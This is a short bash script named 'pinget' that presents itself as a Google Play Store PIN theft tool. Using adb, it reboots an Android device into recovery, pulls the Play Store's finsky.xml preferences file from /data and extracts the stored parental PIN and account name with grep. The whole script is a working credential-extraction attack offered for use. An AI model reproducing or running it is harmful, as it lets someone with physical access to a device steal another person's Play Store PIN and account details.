#!/bin/bash
<<COMMENT1
            ---------------------------------------------------
            pinget - Google Play Store pin theft vulnerability
            ---------------------------------------------------
            Made by cyr0s/compl3x (@Complex360)
            Thanks to zanderman112 && trter10
            ---------------------------------------------------"
            
            TESTED WITH NEXUS7 AND HTC ONE X USING CWM - TWRP? IDK
COMMENT1
echo "
            ---------------------------------------------------
            pinget - Google Play Store pin theft vulnerability
            ---------------------------------------------------
            Made by cyr0s/compl3x (@Complex360)
            Thanks to zanderman112 && trter10
            ---------------------------------------------------"

#Checks if user is root
if [[ "$(whoami)" != 'root'  ]];then
  echo "This script must be run as root!"
  exit
fi

#Checks for adb and fastboot location
if [[ -x /usr/bin/adb ]]
  then
    adblocation=/usr/bin/adb
  else if [[ -x ./files/adb ]]; 
  then
    adblocation=./files/adb
    #File permission fix - Thanks to Mark Lord
    sudo chmod a+rx files/adb
  else
  echo "Please enter the directory (WITHOUT TRAILING FORWARD SLASH) which contains adb"
  read adb
  adblocation="$adb/adb"
fi
fi

echo "Restarting adb"
$adblocation kill-server > /dev/null
$adblocation start-server > /dev/null
echo "Rebooting into recovery"
$adblocation reboot recovery
echo 'Once recovery has loaded, select "mounts and storage" then "mount /data/" then press [ENTER]'
read waiter
echo "Listing devices"
$adblocation devices
echo "Pulling finsky.xml"
$adblocation pull /data/data/com.android.vending/shared_prefs/finsky.xml
echo "Parsing account and pin code"
grep '<string name="pin_code"' finsky.xml | cut -f2 -d">"|cut -f1 -d"<"
grep '<string name="account"' finsky.xml | cut -f2 -d">"|cut -f1 -d"<"